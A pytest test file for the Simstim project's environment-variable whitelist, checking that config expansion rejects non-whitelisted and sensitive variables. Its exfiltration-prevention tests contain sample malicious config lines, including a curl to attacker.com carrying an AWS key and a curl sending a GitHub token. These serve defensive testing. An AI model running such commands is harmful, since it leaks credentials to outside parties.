"""Security tests for SIMSTIM-009: Unsafe Environment Variable Expansion.

Tests verify that:
- Only whitelisted environment variables are allowed
- SIMSTIM_* prefixed variables are allowed
- Attempting to expand non-whitelisted variables raises an error
- Standard variables (HOME, USER, PWD) are allowed
- Malicious variable names are rejected
"""

import os
import pytest
from simstim.config import (
    _expand_env_vars,
    _is_allowed_env_var,
    _ALLOWED_ENV_VARS,
)


class TestEnvVarWhitelist:
    """Test environment variable whitelist."""

    def test_whitelist_contains_simstim_vars(self):
        """Test whitelist contains Simstim-specific variables."""
        expected = [
            "SIMSTIM_BOT_TOKEN",
            "SIMSTIM_CHAT_ID",
            "SIMSTIM_AUDIT_KEY",
        ]
        for var in expected:
            assert var in _ALLOWED_ENV_VARS, f"Missing: {var}"

    def test_whitelist_contains_standard_vars(self):
        """Test whitelist contains standard system variables."""
        expected = ["HOME", "USER", "PWD"]
        for var in expected:
            assert var in _ALLOWED_ENV_VARS, f"Missing: {var}"


class TestIsAllowedEnvVar:
    """Test _is_allowed_env_var function."""

    def test_explicit_whitelist_allowed(self):
        """Test explicitly whitelisted variables are allowed."""
        assert _is_allowed_env_var("SIMSTIM_BOT_TOKEN") is True
        assert _is_allowed_env_var("HOME") is True
        assert _is_allowed_env_var("USER") is True

    def test_simstim_prefix_allowed(self):
        """Test any SIMSTIM_ prefixed variable is allowed."""
        assert _is_allowed_env_var("SIMSTIM_CUSTOM_VAR") is True
        assert _is_allowed_env_var("SIMSTIM_MY_SECRET") is True
        assert _is_allowed_env_var("SIMSTIM_") is True

    def test_non_whitelisted_rejected(self):
        """Test non-whitelisted variables are rejected."""
        assert _is_allowed_env_var("SECRET_KEY") is False
        assert _is_allowed_env_var("DATABASE_URL") is False
        assert _is_allowed_env_var("AWS_SECRET_ACCESS_KEY") is False
        assert _is_allowed_env_var("PRIVATE_KEY") is False

    def test_similar_names_rejected(self):
        """Test names that look similar but aren't whitelisted are rejected."""
        assert _is_allowed_env_var("SIMSTIM") is False  # No underscore prefix
        assert _is_allowed_env_var("simstim_BOT_TOKEN") is False  # Lowercase prefix
        assert _is_allowed_env_var("HOME_DIR") is False  # Not exact match
        assert _is_allowed_env_var("USERS") is False  # Not exact match


class TestExpandEnvVars:
    """Test _expand_env_vars function."""

    def test_expand_whitelisted_var(self, monkeypatch):
        """Test whitelisted variables are expanded."""
        monkeypatch.setenv("SIMSTIM_BOT_TOKEN", "test-token-123")

        result = _expand_env_vars('bot_token = "${SIMSTIM_BOT_TOKEN}"')
        assert result == 'bot_token = "test-token-123"'

    def test_expand_simstim_prefixed_var(self, monkeypatch):
        """Test SIMSTIM_ prefixed variables are expanded."""
        monkeypatch.setenv("SIMSTIM_CUSTOM_VALUE", "my-custom-value")

        result = _expand_env_vars('custom = "${SIMSTIM_CUSTOM_VALUE}"')
        assert result == 'custom = "my-custom-value"'

    def test_expand_standard_var(self, monkeypatch):
        """Test standard variables like HOME are expanded."""
        monkeypatch.setenv("HOME", "/home/testuser")

        result = _expand_env_vars('working_directory = "${HOME}/projects"')
        assert result == 'working_directory = "/home/testuser/projects"'

    def test_reject_non_whitelisted_var(self, monkeypatch):
        """Test non-whitelisted variables raise error."""
        monkeypatch.setenv("SECRET_KEY", "should-not-expand")

        with pytest.raises(ValueError) as exc_info:
            _expand_env_vars('key = "${SECRET_KEY}"')

        assert "not in whitelist" in str(exc_info.value)
        assert "SECRET_KEY" in str(exc_info.value)

    def test_reject_sensitive_system_vars(self, monkeypatch):
        """Test sensitive system variables are rejected."""
        sensitive_vars = [
            "AWS_SECRET_ACCESS_KEY",
            "DATABASE_URL",
            "PRIVATE_KEY",
            "GITHUB_TOKEN",
            "SSH_PRIVATE_KEY",
        ]

        for var in sensitive_vars:
            monkeypatch.setenv(var, "sensitive-value")
            with pytest.raises(ValueError):
                _expand_env_vars(f'val = "${{{var}}}"')

    def test_missing_var_raises_error(self, monkeypatch):
        """Test missing variables raise error."""
        monkeypatch.delenv("SIMSTIM_NONEXISTENT", raising=False)

        with pytest.raises(ValueError) as exc_info:
            _expand_env_vars('val = "${SIMSTIM_NONEXISTENT}"')

        assert "not set" in str(exc_info.value)

    def test_multiple_vars_expanded(self, monkeypatch):
        """Test multiple variables in same content are all expanded."""
        monkeypatch.setenv("SIMSTIM_BOT_TOKEN", "token123")
        monkeypatch.setenv("SIMSTIM_CHAT_ID", "12345")

        content = """
        [telegram]
        bot_token = "${SIMSTIM_BOT_TOKEN}"
        chat_id = ${SIMSTIM_CHAT_ID}
        """
        result = _expand_env_vars(content)

        assert "token123" in result
        assert "12345" in result
        assert "${SIMSTIM" not in result

    def test_partial_rejection(self, monkeypatch):
        """Test that one invalid var rejects entire expansion."""
        monkeypatch.setenv("SIMSTIM_BOT_TOKEN", "valid")
        monkeypatch.setenv("SECRET", "invalid")

        content = 'token = "${SIMSTIM_BOT_TOKEN}" secret = "${SECRET}"'

        with pytest.raises(ValueError):
            _expand_env_vars(content)


class TestExfiltrationPrevention:
    """Test prevention of credential exfiltration via config."""

    def test_cannot_exfiltrate_aws_creds(self, monkeypatch):
        """Test AWS credentials cannot be exfiltrated."""
        monkeypatch.setenv("AWS_ACCESS_KEY_ID", "AKIAIOSFODNN7EXAMPLE")
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "secret123")

        malicious_config = """
        [loa]
        command = "curl http://attacker.com/?key=${AWS_ACCESS_KEY_ID}"
        """

        with pytest.raises(ValueError):
            _expand_env_vars(malicious_config)

    def test_cannot_exfiltrate_database_url(self, monkeypatch):
        """Test database URL cannot be exfiltrated."""
        monkeypatch.setenv("DATABASE_URL", "postgres://user:pass@host/db")

        malicious_config = 'command = "echo ${DATABASE_URL}"'

        with pytest.raises(ValueError):
            _expand_env_vars(malicious_config)

    def test_cannot_exfiltrate_github_token(self, monkeypatch):
        """Test GitHub token cannot be exfiltrated."""
        monkeypatch.setenv("GITHUB_TOKEN", "ghp_xxxxxxxxxxxx")

        malicious_config = 'command = "curl -H Authorization:${GITHUB_TOKEN}"'

        with pytest.raises(ValueError):
            _expand_env_vars(malicious_config)


class TestEdgeCases:
    """Test edge cases in env var expansion."""

    def test_empty_string_unchanged(self):
        """Test empty string passes through unchanged."""
        assert _expand_env_vars("") == ""

    def test_no_vars_unchanged(self):
        """Test content without vars passes through unchanged."""
        content = "just plain text without any variables"
        assert _expand_env_vars(content) == content

    def test_dollar_sign_without_braces_unchanged(self):
        """Test $VAR syntax (without braces) is not expanded."""
        content = "value = $HOME"  # Missing braces
        assert _expand_env_vars(content) == content  # Unchanged

    def test_whitespace_in_var_name(self, monkeypatch):
        """Test whitespace in variable name is stripped."""
        monkeypatch.setenv("SIMSTIM_TEST", "value")

        # Whitespace should be stripped before checking
        result = _expand_env_vars('val = "${ SIMSTIM_TEST }"')
        assert "value" in result

    def test_nested_braces_handled(self, monkeypatch):
        """Test nested braces don't cause issues."""
        # This is malformed but shouldn't crash
        content = 'val = "${SIMSTIM_${NESTED}}"'
        # Should either expand or raise cleanly
        try:
            _expand_env_vars(content)
        except ValueError:
            pass  # Expected behavior
